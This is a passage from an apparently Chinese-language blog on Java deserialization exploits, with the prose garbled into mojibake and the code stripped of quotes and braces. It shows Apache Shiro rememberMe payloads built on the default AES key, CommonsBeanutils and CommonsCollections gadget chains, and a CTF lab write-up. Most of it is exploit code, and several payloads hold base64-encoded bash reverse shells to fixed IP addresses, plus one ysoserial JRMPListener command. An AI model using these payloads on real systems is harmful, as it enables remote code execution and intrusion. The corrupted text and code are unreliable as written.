org.apache.shiro.crypto.AesCipherService;import org.apache.shiro.util.ByteSource;import java.io.ByteArrayOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;public class Poc public static void setFieldValue(Object object, String fieldName, Object value) throws Exception Field field = object.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(object, value); public static byte[] getPayload() throws Exception URL url = new URL(http://a2dz0r9p5z2ofy7sh8ymezjev51wppde.oastify.com); HashMapURL,Object hashMap = new HashMap(); Class? c = url.getClass(); Field field = c.getDeclaredField(hashCode); field.setAccessible(true); field.set(url,114514); hashMap.put(url,11); field.setAccessible(true); field.set(url,-1); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream); outputStream.writeObject(hashMap); outputStream.flush(); return byteArrayOutputStream.toByteArray(); public static void main(String[] args) throws Exception byte[] payloads = getPayload(); AesCipherService aes = new AesCipherService(); byte[] key = Base64.decode(kPH+bIxk5D2deZiIxcaaaA==); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.printf(Base64.encodeToString(ciphertext.getBytes())); ç„¶åæŠŠç”Ÿæˆçš„payloadç²˜è´´åˆ°cookieä¹‹ä¸­ï¼Œç‰¹åˆ«è¦æ³¨æ„çš„æ˜¯è¦æŠŠCookieè¯·æ±‚å¤´ä¸­çš„sessionidåˆ æ‰ è¿™æ˜¯å› ä¸ºä½ ç™»é™†äº†ä¹‹åï¼Œé‚£ä¹ˆæœåŠ¡ç«¯å†æ¬¡æ£€æµ‹è‚¯å®šæ˜¯ä¼˜å…ˆç”¨ä½ ç™»é™†åçš„sessionï¼Œè€Œä¸æ˜¯æˆ‘ä»¬çš„rememberMeäº†ï¼Œæ‰€ä»¥å¿…é¡»åˆ æ‰åæˆ‘ä»¬çš„payloadæ‰èƒ½å¤Ÿå‘æŒ¥ä½œç”¨ ç„¶åæˆ‘ä»¬å†å»çœ‹burpsuiteä¸­çš„dnsè§£æï¼Œå¦‚ä¸‹ï¼š EXPshiroä¸‹çš„ccé“¾åˆ©ç”¨ç”±äºshiroä¸‹é¢é›†æˆäº†cbä¾èµ–ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡cbé“¾æ¥æ„é€ exp package sherlock;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.beanutils.BeanComparator;import org.apache.shiro.codec.Base64;import org.apache.shiro.crypto.AesCipherService;import org.apache.shiro.util.ByteSource;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.URL;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.PriorityQueue;public class Payload public static void setFieldValue(Object object, String fieldName, Object value) throws Exception Field field = object.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(object, value); public static byte[] getPayload() throws Exception TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameField = tc.getDeclaredField(_name); nameField.setAccessible(true); nameField.set(templates, aaa); Field bytecodesField = tc.getDeclaredField(_bytecodes); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); byte[][] codes = code; bytecodesField.set(templates, codes); Field tfactoryField = tc.getDeclaredField(_tfactory); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); BeanComparator beanComparator = new BeanComparator(); beanComparator.setProperty(outputProperties);// beanComparator.compare(templates,null); PriorityQueue priorityQueue = new PriorityQueue(beanComparator); Class c1 = priorityQueue.getClass(); Field queueField = c1.getDeclaredField(queue); queueField.setAccessible(true); queueField.set(priorityQueue,new Object[]templates,templates,templates); Field sizeField = c1.getDeclaredField(size); sizeField.setAccessible(true); sizeField.set(priorityQueue,3); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream); outputStream.writeObject(priorityQueue); outputStream.flush(); return byteArrayOutputStream.toByteArray(); public static void main(String[] args) throws Exception // byte[] payloads = Payload.getPayload();// ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(payloads);// ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);// objectInputStream.readObject(); byte[] payloads = Payload.getPayload(); AesCipherService aes = new AesCipherService(); byte[] key = Base64.decode(kPH+bIxk5D2deZiIxcaaaA==); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.printf(Base64.encodeToString(ciphertext.getBytes())); å…ˆæœ¬åœ°æµ‹è¯•ä¸€ä¸‹ï¼Œå¯ä»¥å¼¹å‡ºè®¡ç®—å™¨ï¼Œç„¶åå†ç”ŸæˆåŠ å¯†åçš„payloadï¼Œæ›¿æ¢æ‰remenberMeä¸­çš„å†…å®¹ï¼Œç„¶åç‚¹å‡»å‘é€ æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ ccæ— ä¾èµ–ä¸Šé¢çš„CBé“¾åˆ©ç”¨çœ‹ä¸Šå»åªç”¨åˆ°äº†commons beanutilsï¼Œä½†æ˜¯å®é™…ä¸Šå½“å±•å¼€BeanComparatorçš„importä¹‹åï¼Œä¼šå‘ç°æ˜¯å¼•å…¥äº†ComparableComparatorçš„ï¼Œè€ŒComparableComparatoræ˜¯åœ¨ccä¸­çš„ã€‚ä½†æ˜¯shiroåªè°ƒç”¨äº†cbä¸­çš„ä¸€éƒ¨åˆ†ç±»ï¼Œè€Œæ²¡æœ‰è°ƒç”¨BeanComparatorï¼Œå› æ­¤ä¸Šé¢çš„é“¾å®é™…ä¸Šæ˜¯éœ€è¦CCä¾èµ–çš„ å½“æˆ‘ä»¬æŠŠpom.xmlä¸­çš„CCä¾èµ–æ³¨é‡Šæ‰ä¹‹åï¼Œå†é‡å¯é¡¹ç›®å¹¶è¿è¡Œæˆ‘ä»¬æœ‰CCä¾èµ–çš„expåï¼Œä¼šæŠ¥é”™å¦‚ä¸‹ï¼š æˆ‘ä»¬å¯ä»¥æ‰“ä¸ªæ–­ç‚¹æŸ¥ä¸€ä¸‹BeanComparatorç±»ä¸­å“ªé‡Œè°ƒç”¨äº†ComparableComparatorï¼Œå¯ä»¥å‘ç°æ˜¯åœ¨è¯¥ç±»çš„è°ƒç”¨æ— å‚æ„é€ å‡½æ•°çš„æ—¶å€™ï¼Œä¼šä¸€ç›´èµ°åˆ°ç¬¬ä¸‰ä¸ªæœ‰ä¸¤ä¸ªå‚æ•°çš„æ„é€ å‡½æ•°å¤„ï¼Œå¹¶ä¸”ç»™å‚æ•°comparatorèµ‹å€¼ä¸ºComparableComparator å› æ­¤æˆ‘ä»¬åªéœ€è¦é€šè¿‡åå°„ä¿®æ”¹ä¸€ä¸‹comparatorçš„å€¼å³å¯ï¼Œä½†æ˜¯ä¿®æ”¹åçš„comparatoræœ‰å‡ ä¸ªå¿…é¡»æ»¡è¶³çš„æ¡ä»¶ å®ç°äº†Serializableæ¥å£ å®ç°äº†Comparatoræ¥å£ åœ¨JDKä¸­æˆ–è€…shiroä¾èµ–ä¸­æˆ–è€…CBä¸­ æœ€ç»ˆæ‰¾åˆ°ä¸€ä¸ªCaseInsensitiveComparatorç±»ä½äºStringä¸­ï¼Œè™½ç„¶æœ¬èº«æ˜¯ç§æœ‰çš„ï¼Œä½†æ˜¯å®ƒè¢«Stringä¸­çš„CASE_INSENSITIVE_ORDERç»™å®ä¾‹åŒ–äº†ï¼ŒCASE_INSENSITIVE_ORDERæ˜¯ä¸€ä¸ªCaseInsensitiveComparatorå¯¹è±¡ æˆ‘ä»¬çŸ¥é“Beancomparatorç±»ä¸­çš„ä¸¤å‚æ„é€ å‡½æ•°æ˜¯publicçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥è°ƒç”¨è¯¥æ„é€ å‡½æ•°æ¥æŠŠcomparatorå€¼ä¿®æ”¹ä¸ºCASE_INSENSITIVE_ORDER payloadï¼š package sherlock;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.beanutils.BeanComparator;import org.apache.shiro.codec.Base64;import org.apache.shiro.crypto.AesCipherService;import org.apache.shiro.util.ByteSource;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.URL;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.PriorityQueue;public class Payload public static void setFieldValue(Object object, String fieldName, Object value) throws Exception Field field = object.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(object, value); public static byte[] getPayload() throws Exception TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameField = tc.getDeclaredField(_name); nameField.setAccessible(true); nameField.set(templates, aaa); Field bytecodesField = tc.getDeclaredField(_bytecodes); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); byte[][] codes = code; bytecodesField.set(templates, codes); Field tfactoryField = tc.getDeclaredField(_tfactory); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); beanComparator.setProperty(outputProperties);// beanComparator.compare(templates,null); PriorityQueue priorityQueue = new PriorityQueue(beanComparator); Class c1 = priorityQueue.getClass(); Field queueField = c1.getDeclaredField(queue); queueField.setAccessible(true); queueField.set(priorityQueue,new Object[]templates,templates,templates); Field sizeField = c1.getDeclaredField(size); sizeField.setAccessible(true); sizeField.set(priorityQueue,3); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream); outputStream.writeObject(priorityQueue); outputStream.flush(); return byteArrayOutputStream.toByteArray(); public static void main(String[] args) throws Exception byte[] payloads = Payload.getPayload(); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(payloads); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);// objectInputStream.readObject();// byte[] payloads = Payload.getPayload(); AesCipherService aes = new AesCipherService(); byte[] key = Base64.decode(kPH+bIxk5D2deZiIxcaaaA==); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.printf(Base64.encodeToString(ciphertext.getBytes())); æˆåŠŸå¼¹çª—","categories":["javaååºåˆ—åŒ–"]},{"title":"JavaDeserializeLabs","path":"/2024/11/15/JavaDeserializeLabs/","content":"Lab1åœ¨javaä¸­å¯¹äºbashå‘½ä»¤çš„æ‰§è¡Œä¼šæŠŠå®ƒæŒ‰ç…§ç©ºæ ¼åˆ†æˆä¸‰éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯åå¼¹shellå‘½ä»¤ä¸­åªèƒ½å­˜åœ¨ä¸¤ä¸ªç©ºæ ¼ åºåˆ—åŒ–è„šæœ¬å¦‚ä¸‹ï¼š package yxxx.javasec.deserialize;import com.yxxx.javasec.deserialize.Calc;import com.yxxx.javasec.deserialize.Utils;import java.io.ByteArrayOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;public class Test public static void main(String[] args) throws Exception Calc calc = new Calc(); Class c = calc.getClass(); Field field = c.getDeclaredField(canPopCalc); field.setAccessible(true); field.set(calc,true); Field field1 = c.getDeclaredField(cmd); field1.setAccessible(true); field1.set(calc,bash -c echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTMuMTAyLjQ2Lzc3NzcgMD4mMQ0K|base64,-d|bash,-i); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(calc); System.out.println(Utils.bytesTohexString(byteArrayOutputStream.toByteArray())); Lab2è¯¥é¢˜é¢˜ç›®æ²¡æœ‰æä¾›ä»»ä½•çš„ç±»ä¾›æˆ‘ä»¬æ¥è§£å†³é—®é¢˜ï¼Œä½†æ˜¯æˆ‘ä»¬çœ‹æä¾›çš„åº“é‡Œé¢æœ‰CommonsCollectionsä¾èµ–ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ccé“¾å®ç°ååºåˆ—åŒ–ï¼Œè¾¾åˆ°rceçš„ç›®çš„ ç”±äºåƒcc1ç­‰é“¾ä¼šå—åˆ°jdkç‰ˆæœ¬çš„é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™è¾¹ä½¿ç”¨ä¸ä¼šå—ç‰ˆæœ¬é™åˆ¶çš„ä¸€æ¡é“¾ï¼Œä¹Ÿå°±æ˜¯cc6ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„payloadå¦‚ä¸‹ï¼š package org.example.lab2.demos.web;import com.yxxx.javasec.deserialize.Utils;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class Sherlock public static void main(String[] args) throws Exception Transformer[] transformers = new Transformer[] new ConstantTransformer(Runtime.class), new InvokerTransformer(getMethod,new Class[]String.class,Class[].class,new Object[]getRuntime,null), new InvokerTransformer(invoke,new Class[]Object.class,Object[].class,new Object[]null,null), new InvokerTransformer(exec, new Class[]String.class, new Object[]bash -c echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTMuMTAyLjQ2Lzc3NzcgMD4mMQ0K|base64,-d|bash,-i) ; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMapObject, Object map = new HashMap(); MapObject, Object lazyMap = LazyMap.decorate(map, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, aaa); HashMapObject, Object map2 = new HashMap(); map2.put(tiedMapEntry, bbb); lazyMap.remove(aaa); Class c = LazyMap.class; Field factoryField = c.getDeclaredField(factory); factoryField.setAccessible(true); factoryField.set(lazyMap, chainedTransformer); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeUTF(SJTU); objectOutputStream.writeInt(1896); objectOutputStream.writeObject(map2); System.out.println(Utils.bytesTohexString(byteArrayOutputStream.toByteArray()));// ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));// String name = objectInputStream.readUTF();// int year = objectInputStream.readInt();// if (name.equals(SJTU) year == 1896) // objectInputStream.readObject();// Lab3é¦–å…ˆè§‚å¯Ÿåˆ°é¢˜ç›®æä¾›çš„åº“é‡Œé¢è¿˜æ˜¯æœ‰CommonsCollectionsä¾èµ–ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠç¬¬äºŒé¢˜çš„payloadå…ˆç›´æ¥cvä¸€éï¼Œä½†æ˜¯è¦æ³¨æ„çš„æ˜¯åœ¨è¿›è¡Œæœ¬åœ°æµ‹è¯•çš„æ—¶å€™ååºåˆ—åŒ–çš„ä»£ç è¦æ›´æ”¹ä¸ºä¸é¢˜ç›®ç¬¦åˆçš„ è¿™æ˜¯å› ä¸ºåœ¨æ–‡ä»¶IndexController.classä¸­è°ƒç”¨çš„æ˜¯è‡ªå·±å†™çš„MyObjectInputStreamç±» ç±»çš„å†…å®¹å¦‚ä¸‹ï¼Œé‡å†™äº†ä¸€ä¸ªresolveClass()æ–¹æ³•ä»¥åŠæ„é€ å‡½æ•°ï¼Œæ„é€ å‡½æ•°ä¸­è·å–ç±»Transformerç±»çš„ç±»åŠ è½½å™¨ï¼Œå‘ä¸Šè½¬å‹ä¸ºURLClassLoaderï¼Œè·å–URLæ•°ç»„å¯¹è±¡ï¼Œèµ‹å€¼ç»™classLoader é‡å†™çš„resolveClass()æ–¹æ³•ä¸­ï¼Œè°ƒç”¨çš„æ˜¯è¿™ä¸ªæ–°çš„classLoaderæ¥è¿›è¡Œç±»åŠ è½½ public class MyObjectInputStream extends ObjectInputStream private ClassLoader classLoader; public MyObjectInputStream(InputStream inputStream) throws Exception super(inputStream); URL[] urls = ((URLClassLoader)Transformer.class.getClassLoader()).getURLs(); this.classLoader = new URLClassLoader(urls); protected Class? resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException Class clazz = this.classLoader.loadClass(desc.getName()); return clazz; æ›´æ”¹å®Œæµ‹è¯•çš„æ—¶å€™ä¼šç›´æ¥æŠ¥é”™å¦‚ä¸‹ï¼š è¿™é‡Œçš„[Lå¼€å¤´æŒ‡çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå³Transformeræ•°ç»„ç±»å»è¿›è¡Œç±»åŠ è½½å¤±æ•ˆ ç‚¹å‡»ä¸‹é¢ä¸€è¡Œçš„æŠ¥é”™ï¼Œè·³è½¬è‡³URLClassLoader.classæ–‡ä»¶ä¸­å¯ä»¥å‘ç°æŠ›å‡ºè¯¥å¼‚å¸¸çš„åŸå› æ˜¯resultnull å¾€ä¸Šçœ‹resultå€¼çš„è·å–ä¸ºä¸‹é¢è¿™æ®µä»£ç ï¼š result = AccessController.doPrivileged( new PrivilegedExceptionActionClass?() public Class? run() throws ClassNotFoundException String path = name.replace(., /).concat(.class); Resource res = ucp.getResource(path, false); if (res != null) try return defineClass(name, res); catch (IOException e) throw new ClassNotFoundException(name, e); else return null; , acc); å‚æ•°pathæ˜¯å°†nameä¸­çš„æ‰€æœ‰.éƒ½æ›¿æ¢ä¸ºåæ–œæ ï¼Œç„¶åæœ€åæ¥ä¸Š.class ç„¶åå¾—åˆ°çš„pathç”¨äºgetResource()è·å–èµ„æºï¼ŒæˆåŠŸçš„è¯å°±è°ƒç”¨defineClass()è¿›è¡Œç±»åŠ è½½ä»è€Œå¾—åˆ°result æˆ‘ä»¬åœ¨è¿™è¾¹æ‰“ä¸Šæ–­ç‚¹çœ‹ä¸€ä¸‹ï¼Œè¿™ä¸€æ­¥æˆ‘æ˜¯ä¸€ç›´ç‚¹ç»¿è‰²çš„æ¢å¤ç¨‹åºæ‰è°ƒè¯•åˆ°çš„ å‘ç°nameçš„å€¼æ˜¯å¥‡å¥‡æ€ªæ€ªçš„ä¸€ä¸ªæ•°ç»„ç±» ç»§ç»­è°ƒè¯•å‘ç°æŠ›å‡ºå¼‚å¸¸çš„åŸå› å°±æ˜¯å› ä¸ºæ˜¯æ•°ç»„ç±» å°è¯•è¿‡åå‘ç°åªè¦æ˜¯æ•°ç»„é‚£ä¹ˆéƒ½ä¼šæŠ›å‡ºå¼‚å¸¸ æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹ObjectInputStreamç±»ä¸­çš„åŸç”ŸresolveClass() protected Class? resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException String name = desc.getName(); try return Class.forName(name, false, latestUserDefinedLoader()); catch (ClassNotFoundException ex) Class? cl = primClasses.get(name); if (cl != null) return cl; else throw ex; å¯ä»¥å‘ç°è°ƒç”¨çš„ç±»åŠ è½½æ–¹æ³•æ˜¯forNameï¼Œè€Œåœ¨è‡ªå®šä¹‰çš„MyObjectInputStream.classä¸­è°ƒç”¨çš„ç±»åŠ è½½æ–¹æ³•æ˜¯loadClass æ€€ç–‘loadClassæ–¹æ³•ä¸æ”¯æŒåŠ è½½æ•°ç»„ç±»ï¼Œæ‰€ä»¥è‡ªå·±é‡å†™äº†ä¸ªMyObjectInputStream1ï¼Œé€šè¿‡åˆ¤æ–­æ˜¯ä¸æ˜¯æ•°ç»„å¯¹è±¡çš„ç±»åŠ è½½ å¦‚æœæ˜¯çš„è¯ï¼Œåº”ä»¥[Lå¼€å¤´ï¼Œè¿™æ—¶å€™æˆ‘ä»¬è°ƒç”¨forName()å³å¯ï¼ŒæˆåŠŸè§¦å‘å‘½ä»¤ public class MyObjectInputStream1 extends ObjectInputStream private ClassLoader classLoader; public MyObjectInputStream1(InputStream in) throws Exception super(in); URL[] urls = ((URLClassLoader) ClassLoader.getSystemClassLoader()).getURLs(); this.classLoader = ClassLoader.getSystemClassLoader(); protected Class? resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException if (desc.getName().startsWith([L)) return Class.forName(desc.getName()); return this.classLoader.loadClass(desc.getName());// return Class.forName(desc.getName()); æˆåŠŸè¯æ˜loadClassæ–¹æ³•ä¸æ”¯æŒæ•°ç»„ç±»åŠ è½½ï¼Œgptéª—æˆ‘ æ‰€ä»¥æˆ‘ä»¬çš„payloadä¸­ä¸èƒ½å¤Ÿæœ‰æ•°ç»„ï¼Œæƒ³èµ·äº†åˆšåˆšå­¦å®Œçš„shiroååºåˆ—åŒ–ä¸­æ²¡æœ‰ç”¨åˆ°æ•°ç»„ç±»ï¼Œä½†å¾ˆå¯æƒœæ²¡æœ‰CBä¾èµ– åˆ°ysoä¸­å»çœ‹çœ‹æœ‰æ²¡æœ‰ç”¨ä¸åˆ°æ•°ç»„ç±»ï¼Œåˆæ˜¯jdkè‡ªèº«çš„é“¾å­çš„ æ­£å¥½å°±åœ¨payloadsJRMPLinsteneræ–‡ä»¶ä¸­ï¼Œå…¶gadgetå¦‚ä¸‹ Gadget chain: UnicastRemoteObject.readObject(ObjectInputStream) line: 235 UnicastRemoteObject.reexport() line: 266 UnicastRemoteObject.exportObject(Remote, int) line: 320 UnicastRemoteObject.exportObject(Remote, UnicastServerRef) line: 383 UnicastServerRef.exportObject(Remote, Object, boolean) line: 208 LiveRef.exportObject(Target) line: 147 TCPEndpoint.exportObject(Target) line: 411 TCPTransport.exportObject(Target) line: 249 TCPTransport.listen() line: 319 å†çœ‹çœ‹é¢˜ç›®jdkç‰ˆæœ¬ä¸º8u222ï¼Œæ­£å¥½å¯ä»¥ç›´æ¥åˆ©ç”¨è¯¥é“¾ å¼€å¯JRMP Listener java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 bash -c echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMjguMTA5LzkzMjAgMD4mMQ==|base64, -d|bash, -i payload package org.example;import com.yxxx.javasec.deserialize.MyObjectInputStream;import com.yxxx.javasec.deserialize.Utils;import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Proxy;import java.rmi.AlreadyBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.rmi.server.ObjID;import java.rmi.server.RemoteObjectInvocationHandler;import java.util.Random;public class Main public static void main(String[] args) throws Exception Registry reg = LocateRegistry.getRegistry(192.168.0.103,1099); ObjID id = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint te = new TCPEndpoint(192.168.0.103, 1099); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref); Registry proxy = (Registry) Proxy.newProxyInstance(Main.class.getClassLoader(), new Class[] Registry.class , obj); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeUTF(SJTU); objectOutputStream.writeInt(1896); objectOutputStream.writeObject(proxy); System.out.println(Utils.bytesTohexString(byteArrayOutputStream.toByteArray())); ByteArrayInputStream inputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new MyObjectInputStream(inputStream); objectInputStream.readUTF(); objectInputStream.readInt(); objectInputStream.readObject(); System.out.println(Utils.bytesTohexString(byteArrayOutputStream.toByteArray())); Lab4å…ˆæŸ¥çœ‹ä¸€æ‰‹ä¾èµ–åº“ï¼Œå‘ç°æœ‰jacksonçš„ç›¸å…³åº“ï¼Œå¹¶ä¸”ç‰ˆæœ¬é«˜äº2.10ï¼Œç›´æ¥ä¸Šé€šæ€poc ç»“æœå¾ˆé—æ†¾ï¼Œé¢˜ç›®æ²¡æœ‰javassiståº“ï¼Œè¯¥å¦å¯»ä»–è·¯äº† javaå±‚é¢çš„ä»£ç å’Œlab3æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼Œä½†æ˜¯å¤šäº†ä¸€å±‚nginxé…ç½®é˜»æ­¢å‡ºç½‘ åœ¨RMIConnectorä¸‹çš„fimdRMIServerJRMP()æ–¹æ³•ä¸‹ï¼Œæœ‰ä¸€å¤„ååºåˆ—åŒ– ä»å‡½æ•°å†…å®¹å¯çŸ¥æ˜¯å°†ä¼ å…¥çš„å‚æ•°base64è¿›è¡Œbase64è§£ç ä¹‹åå†å°†å…¶è¿›è¡Œååºåˆ—åŒ– æŸ¥æ‰¾è¯¥å‡½æ•°çš„ç”¨æ³•ï¼Œè¿˜æ˜¯ä½äºåŒæ–‡ä»¶ä¸‹çš„findRMIServeræ–¹æ³•ä¸­ï¼Œåªè¦ä¼ å…¥çš„è·¯å¾„æ»¡è¶³/stub/å¼€å¤´å°±è¡Œ æŸ¥æ‰¾findRMIServerçš„ç”¨æ³•ï¼Œä½äºåŒæ–‡ä»¶ä¸‹çš„connectæ–¹æ³•ä¸­ è¦æ€ä¹ˆè°ƒç”¨åˆ°connectæ–¹æ³•å‘¢ï¼Œæ ¹æ®å‰é¢å­¦ä¹ åˆ°çš„ccé“¾å¯çŸ¥èƒ½é€šè¿‡invokerTransformerç±»æ¥è§¦å‘ï¼Œä½†æ˜¯è¯¥é¢˜æ˜¯ä¸å…è®¸æ•°ç»„ç±»çš„å­˜åœ¨ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨chainTransformerç±»ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨CC6ä¸­çš„TiedMapEntryçš„æ–¹å¼æ¥è§¦å‘invokerTransformerï¼Œå¹¶ä»¥HashMapå½“ä½œå…¥å£ç±» connectæ–¹æ³•ä¸­çš„jmxServiceURLå‚æ•°æ˜¯åœ¨è¯¥ç±»çš„æ„é€ å‡½æ•°ä¸­è·å–çš„ æ ¹æ®è¯¥æ„é€ å‡½æ•°ç®€å•å†™ä¸ªå‡½æ•° public static Object getBind() throws Exception JMXServiceURL jmxServiceURL = new JMXServiceURL(http://www.baidu.com); RMIConnector connector = new RMIConnector(jmxServiceURL, new HashMap()); connector.connect(); System.out.println(jmxServiceURL.getURLPath()); return null; æŠ¥é”™ æŸ¥äº†ä¸€ä¸‹å‘ç°urlå‰é¢å¿…é¡»åŠ ä¸Šservice:jmx:ï¼Œä¿®æ”¹ä¸€æ‰‹ ç»§ç»­æŠ¥é”™å¦‚ä¸‹ è°ƒè¯•ä¸€æ‰‹ï¼Œå‘ç°åè®®éœ€è¦æ”¹ä¸€ä¸‹ï¼Œä¸èƒ½å¤Ÿæ˜¯httpåè®® ç»§ç»­ä¿®æ”¹ï¼š public static Object getBind() throws Exception JMXServiceURL jmxServiceURL = new JMXServiceURL(service:jmx:rmi://www.baidu.com); RMIConnector connector = new RMIConnector(jmxServiceURL, new HashMap()); connector.connect(); System.out.println(jmxServiceURL.getURLPath()); return null; ç»§ç»­æŠ¥é”™ è¿™æŠ¥é”™å¾ˆæ˜æ˜¾ï¼Œç›´æ¥ä¿®æ”¹ï¼š public static Object getBind() throws Exception JMXServiceURL jmxServiceURL = new JMXServiceURL(service:jmx:rmi://www.baidu.com/stub/12138); RMIConnector connector = new RMIConnector(jmxServiceURL, new HashMap()); connector.connect(); System.out.println(jmxServiceURL.getURLPath()); return null; è™½ç„¶æŠ¥é”™ä½†æˆ‘ä»¬å·²ç»èµ°åˆ°äº†base64è§£ç çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªè¦åœ¨/stub/åé¢åŠ ä¸Šæˆ‘ä»¬base64è§£ç åçš„payloadå°±å¯ä»¥äº† æ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬å°±åŠ ä¸ŠTiedMapEntryï¼š public static Object getBind() throws Exception JMXServiceURL jmxServiceURL = new JMXServiceURL(service:jmx:rmi://www.baidu.com/stub/12138); RMIConnector connector = new RMIConnector(jmxServiceURL, new HashMap()); connector.connect(); System.out.println(jmxServiceURL.getURLPath()); InvokerTransformer invokerTransformer = new InvokerTransformer(connect,null,null); HashMapObject, Object map = new HashMap(); MapObject, Object lazyMap = LazyMap.decorate(map, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, connector); HashMapObject, Object map2 = new HashMap(); map2.put(tiedMapEntry, bbb); lazyMap.remove(connector); Class c = LazyMap.class; Field factoryField = c.getDeclaredField(factory); factoryField.setAccessible(true); factoryField.set(lazyMap, invokerTransformer); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream); outputStream.writeObject(map2); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); return null; è·Ÿä¸Šé¢åŒæ 